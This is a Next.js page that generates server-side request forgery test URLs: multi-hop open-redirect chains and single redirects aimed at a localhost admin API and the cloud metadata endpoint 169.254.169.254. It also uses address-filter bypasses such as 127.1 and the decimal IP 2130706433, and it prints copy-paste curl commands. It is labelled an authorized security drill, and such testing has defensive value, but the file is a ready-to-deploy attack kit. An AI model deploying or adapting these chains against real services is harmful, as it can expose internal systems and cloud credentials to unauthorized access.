// AUTHORIZED SECURITY DRILL USE ONLY — delete after testing.
export default function Home() {
  const ORIGIN = 'https://redirect-drill.vercel.app'; // change after deploy
  const TERM_INTERNAL = 'http://127.0.0.1:8000/api/v1/admin';
  const TERM_BENIGN = 'https://example.com';

  const enc = encodeURIComponent;
  const r = (code, to) => `${enc(`/api/r?code=${code}&to=${enc(to)}`)}`;

  // 5-hop chains, built outside-in: hop0 targets hop1's /api/r URL, etc.
  function chain(codes, terminal) {
    let inner = enc(terminal);
    for (let i = codes.length - 1; i >= 0; i--) {
      inner = enc(`/api/r?code=${codes[i]}&hop=${i}&to=${inner}`);
    }
    return `${ORIGIN}/api/r?code=${codes[0]}&hop=0&to=${inner}`;
  }

  const hop5 = [301, 302, 303, 307, 308];
  const internal5 = chain(hop5, TERM_INTERNAL);
  const benign5 = chain([302, 302, 302, 302, 302], TERM_BENIGN);
  const mixed5 = chain([307, 301, 303, 308, 302], TERM_INTERNAL);

  const singles = [TERM_INTERNAL, 'http://127.1:8000/api/v1/admin', 'http://169.254.169.254/latest/meta-data/', 'http://2130706433:8000/api/v1/admin'];

  const curl5 = `curl -sIL "${internal5}"`;
  const curlBenign = `curl -sIL "${benign5}"`;
  const curlMixed = `curl -sIL "${mixed5}"`;

  const matrix = [
    ['301 chain (5 hops -> internal)', chain([301, 301, 301, 301, 301], TERM_INTERNAL)],
    ['302 chain (5 hops -> internal)', chain([302, 302, 302, 302, 302], TERM_INTERNAL)],
    ['307 chain (5 hops -> internal)', chain([307, 307, 307, 307, 307], TERM_INTERNAL)],
    ['308 chain (5 hops -> internal)', chain([308, 308, 308, 308, 308], TERM_INTERNAL)],
    ['mixed 301/302/303/307/308 -> internal', mixed5],
    ['mixed -> benign example.com', benign5],
    ['single hop 301 -> 127.0.0.1:8000', `${ORIGIN}/api/r?code=301&to=${enc(TERM_INTERNAL)}`],
    ['single hop 302 -> 127.0.0.1:8000', `${ORIGIN}/api/r?code=302&to=${enc(TERM_INTERNAL)}`],
    ['single hop 302 -> 127.1:8000', `${ORIGIN}/api/r?code=302&to=${enc(singles[1])}`],
    ['single hop 302 -> 169.254.169.254', `${ORIGIN}/api/r?code=302&to=${enc(singles[2])}`],
    ['single hop 302 -> decimal IP 2130706433', `${ORIGIN}/api/r?code=302&to=${enc(singles[3])}`],
    ['single hop 302 -> benign example.com', `${ORIGIN}/api/r?code=302&to=${enc(TERM_BENIGN)}`],
  ];

  return (
    <main style={{ fontFamily: 'monospace', maxWidth: 1100, margin: '2rem auto', padding: '0 1rem' }}>
      <h1>Redirect Drill</h1>
      <p>AUTHORIZED SECURITY DRILL USE ONLY — delete after testing.</p>

      <h2>Copy-paste curl</h2>
      <pre style={{ background: '#f4f4f4', padding: 12, overflowX: 'auto' }}>{curl5}</pre>
      <pre style={{ background: '#f4f4f4', padding: 12, overflowX: 'auto' }}>{curlBenign}</pre>
      <pre style={{ background: '#f4f4f4', padding: 12, overflowX: 'auto' }}>{curlMixed}</pre>

      <h2>Test matrix</h2>
      <table style={{ borderCollapse: 'collapse', width: '100%' }} border="1">
        <thead>
          <tr><th align="left">Scenario</th><th align="left">Entry URL</th></tr>
        </thead>
        <tbody>
          {matrix.map(([name, url]) => (
            <tr key={name}>
              <td style={{ padding: 6 }}>{name}</td>
              <td style={{ padding: 6, wordBreak: 'break-all' }}>{url}</td>
            </tr>
          ))}
        </tbody>
      </table>

      <h2>Notes</h2>
      <ul>
        <li>Replace <code>ORIGIN</code> in <code>pages/index.js</code> with your deployed Vercel URL.</li>
        <li>Build custom chains: <code>/api/chain?hops=302|https://a,301|https://b,TARGET</code> (returns the entry URL).</li>
        <li>Every hop is logged with timestamp, IP, hop index, target, and status.</li>
      </ul>
    </main>
  );
}
